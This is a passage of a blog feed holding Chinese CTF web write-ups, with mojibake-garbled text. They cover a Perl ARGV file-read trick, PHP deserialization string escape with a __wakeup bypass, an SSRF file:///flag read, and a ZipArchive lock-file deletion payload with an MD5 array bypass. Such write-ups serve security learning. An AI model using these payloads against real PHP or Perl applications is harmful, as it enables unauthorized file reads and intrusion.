title="No-pass-needed"></a>No-pass-needed</h1><p><img src="/2021/10/30/csaw2021/2.png" alt="image-20211031152446651"></p><p>flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAW2016ï¼ši_got_id</title>
      <link href="2021/10/29/csaw2016-i-got-id/"/>
      <url>2021/10/29/csaw2016-i-got-id/</url>
      
        <content type="html"><![CDATA[<p>çŒœæµ‹Perl File UploadåŽç«¯ä»£ç ä¸º:</p><pre class=" language-php"><code class="language-php"><span class="token keyword">use</span> <span class="token package">strict</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">warnings</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">CGI</span><span class="token punctuation">;</span>my <span class="token variable">$cgi</span><span class="token operator">=</span> <span class="token constant">CGI</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">new</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span> <span class="token string">'file'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>my <span class="token variable">$file</span><span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span> <span class="token string">'file'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token markup">&lt;$file></span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">print</span> <span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p>å…¶ä¸­my $file= $cgi-&gt;param( â€˜fileâ€™ );ï¼š<br>param()å‡½æ•°è¿”å›žä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ã€‚ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥fileå˜é‡ä¸­ã€‚</p><p>while ( &lt;$file&gt; )ä¸­ï¼Œ&lt;&gt;ä¸èƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œé™¤éžæ˜¯ARGVï¼Œå› æ­¤å¾ªçŽ¯éåŽ†å¹¶å°†æ¯ä¸ªå€¼ä½¿ç”¨open()<br>è°ƒç”¨ã€‚</p><p>å¯¹äºŽè¯»æ–‡ä»¶ï¼Œå¦‚æžœä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚<br>æ‰€ä»¥ï¼Œåœ¨ä¸Šä¼ çš„æ­£å¸¸æ–‡ä»¶å‰åŠ ä¸Šä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡¹ARGVï¼Œç„¶åŽåœ¨URLä¸­ä¼ å…¥æ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œå°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ã€‚</p><p>åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶æŠ“å–æ•°æ®åŒ…ï¼š</p><p><img src="/2021/10/29/csaw2016-i-got-id/image-20211029215740211.png" alt="image-20211029215740211"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Perl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugkuï¼šnewphp</title>
      <link href="2021/10/29/bugku-newphp/"/>
      <url>2021/10/29/bugku-newphp/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// phpç‰ˆæœ¬:5.4.44</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$hint</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span><span class="token operator">===</span><span class="token string">"hint.php"</span><span class="token punctuation">)</span>            @<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">!=</span> <span class="token string">"â•­(â—ï½€âˆ€Â´â—)â•¯"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//There's a hint in ./hint.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string">"â•°(â—â€™â—¡â€™â—)â•®"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag/is'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NoNoNo!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>unserializeè§¦å‘<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ï¼š</p><pre class=" language-php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">!=</span> <span class="token string">"â•­(â—ï½€âˆ€Â´â—)â•¯"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//There's a hint in ./hint.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string">"â•°(â—â€™â—¡â€™â—)â•®"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span></code></pre><p>æ˜¾ç„¶è¿™é‡Œä¼šä½¿<code>this-&gt;hint = "â•°(â—â€™â—¡â€™â—)â•®"</code>ï¼Œæ‰€ä»¥è¦ç»•è¿‡<code>__wakeup()</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token string">"hint.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/2021/10/29/bugku-newphp/image-20211029203243929.png" alt="image-20211029203243929"></p><p><strong>payload:</strong></p><pre><code>O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}</code></pre><p>å®žä¾‹åŒ–åŽå°±ä¼šè§¦å‘<code>__condtruct</code>å’Œ<code>__destruct</code>é­”æœ¯æ–¹æ³•</p><p><code>__destruct</code>æœ‰å±é™©å‡½æ•°<code>file_get_contents</code>åˆ©ç”¨ç‚¹</p><p><code>unserialize(read(write($a)));</code>è°ƒç”¨readå’Œwriteå‡½æ•°ï¼Œå°±æœ‰å¯èƒ½å‡ºçŽ°ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</p><h4 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p><strong>payload:</strong></p><pre><code>username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=1";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}</code></pre><p><strong>åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š</strong></p><pre><code>O:4:"User":2:{s:8:"username";s:48:"********";s:8:"password";s:44:"1";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}";}</code></pre><p>å®ƒçš„usernameé”®å€¼</p><pre><code>********";s:8:"password";s:44:"1";O:4:"evil":2:{</code></pre><p>ä»Žè€Œä½¿hintæŒ‡å‘hint.php</p><h4 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h4><p><strong>payloadï¼š</strong></p><pre><code>username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=1";s:8:"password";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}}</code></pre><p><strong>åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š</strong></p><pre><code>O:4:"User":2:{s:8:"username";s:48:"********";s:8:"password";s:60:"1";s:8:"password";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}}";}</code></pre><p>usernameé”®å€¼ï¼š</p><pre><code>********";s:8:"password";s:60:"1";s:8:"password</code></pre><p>ä»Žè€Œä½¿evilç±»åŒ…å«hint-&gt;hint.php</p><p>è°ƒç”¨file_get_contents</p><p>base64è§£ç <code>index.cgi</code></p><pre><code>{  "args": {    "name": "Bob"  },   "headers": {    "Accept": "*/*",     "Host": "httpbin.org",     "User-Agent": "curl/7.64.0",     "X-Amzn-Trace-Id": "Root=1-60cc5790-4d6de1ed0d4813ab786ed249"  },   "origin": "114.67.246.176",   "url": "http://httpbin.org/get?name=Bob"}</code></pre><p>å¯èƒ½æœ‰ssrf</p><p>å°trick</p><p>çŸ¥é“ssrfå­˜åœ¨ç„¶åŽå°±å¯ä»¥é€šè¿‡fileåè®®æ¥ç›´æŽ¥è¯»å–flagäº†</p><p>payloadï¼š?name= file:///flag</p><p>é‡ç‚¹åœ¨ååºåˆ—åŒ–ä¸Šå¯ä»¥çœ‹ï¼š</p><p><a href="https://www.cnblogs.com/c0d1/p/14900076.html">https://www.cnblogs.com/c0d1/p/14900076.html</a></p><p><a href="https://blog.csdn.net/m0_58189778/article/details/119793044">https://blog.csdn.net/m0_58189778/article/details/119793044</a></p><p>ç½‘ä¸Šæ‰¾çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸æµ‹è¯•çŽ¯å¢ƒï¼š</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#å‚è€ƒå­—èŠ‚è„‰æå®žéªŒå®¤</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">lemon</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$lemon</span> <span class="token operator">=</span> <span class="token string">'/p/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$lemon</span><span class="token punctuation">,</span><span class="token string">'ww'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">'20'</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">lemon</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><a href="https://blog.csdn.net/qq_43431158/article/details/108210822">https://blog.csdn.net/qq_43431158/article/details/108210822</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugkuï¼šnoteasytrick</title>
      <link href="2021/10/28/bugku-noteasytrick/"/>
      <url>2021/10/28/bugku-noteasytrick/</url>
      
        <content type="html"><![CDATA[<h5 id="phpåˆ©ç”¨ZipArchiveç±»æ“ä½œæ–‡ä»¶çš„å®žä¾‹"><a href="#phpåˆ©ç”¨ZipArchiveç±»æ“ä½œæ–‡ä»¶çš„å®žä¾‹" class="headerlink" title="phpåˆ©ç”¨ZipArchiveç±»æ“ä½œæ–‡ä»¶çš„å®žä¾‹"></a>phpåˆ©ç”¨ZipArchiveç±»æ“ä½œæ–‡ä»¶çš„å®žä¾‹</h5><p><a href="https://www.jb51.net/article/179039.htm">https://www.jb51.net/article/179039.htm</a></p><h5 id="fastcollå·¥å…·"><a href="#fastcollå·¥å…·" class="headerlink" title="fastcollå·¥å…·"></a>fastcollå·¥å…·</h5><p><a href="https://www.zeroplace.cn/article.asp?id=886">https://www.zeroplace.cn/article.asp?id=886</a></p><h1 id="noteasytrick"><a href="#noteasytrick" class="headerlink" title="noteasytrick"></a>noteasytrick</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span><span class="token string">"Off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Jesen</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$me</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">me</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">me</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Ctf</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"die"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"./sandbox/lock.lock"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"./sandbox/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"or you can guess the final filename?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ç†è§£ä¸€ä¸‹è¿™æ®µä»£ç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"./sandbox/lock.lock"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"./sandbox/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"or you can guess the final filename?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>å¦‚æžœå­˜åœ¨<code>./sandbox/lock.lock</code>dieæŽ‰ï¼Œè®¿é—®<code>./sandbox/lock.lock</code>å¾ˆæ˜¾ç„¶æ˜¯å­˜åœ¨çš„</p><p>å¦‚æžœä¸å­˜åœ¨æ‰§è¡Œ<code>echo file_get_contents(substr($_POST['b'],0,30));</code>å¾ˆæ˜¾ç„¶åˆæ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œåªè¦è®©b=flagä¹‹ç±»çš„å°±è¡Œ</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦ä½¿ç”¨ZipArchiveå†…ç½®å‡½æ•°åˆ é™¤æ–‡ä»¶</p><p><strong>payloadï¼š</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Jesen</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'./sandbox/lock.lock'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$me</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">Jesen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zip</span>  <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">ZipArchive</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">me</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'":3:'</span><span class="token punctuation">,</span><span class="token string">'":4:'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span></code></pre><p><img src="/2021/10/28/bugku-noteasytrick/image-20211028200859831.png" alt="image-20211028200859831"></p><pre><code>a[]=1&amp;b[]=2&amp;c=O:5:"Jesen":4:{s:8:"filename";s:19:"./sandbox/lock.lock";s:7:"content";i:8;s:2:"me";O:10:"ZipArchive":5:{s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";}}</code></pre><p>å°±å¯ä»¥æ•°ç»„ç»•è¿‡MD5åˆ¤æ–­å¹¶åˆ 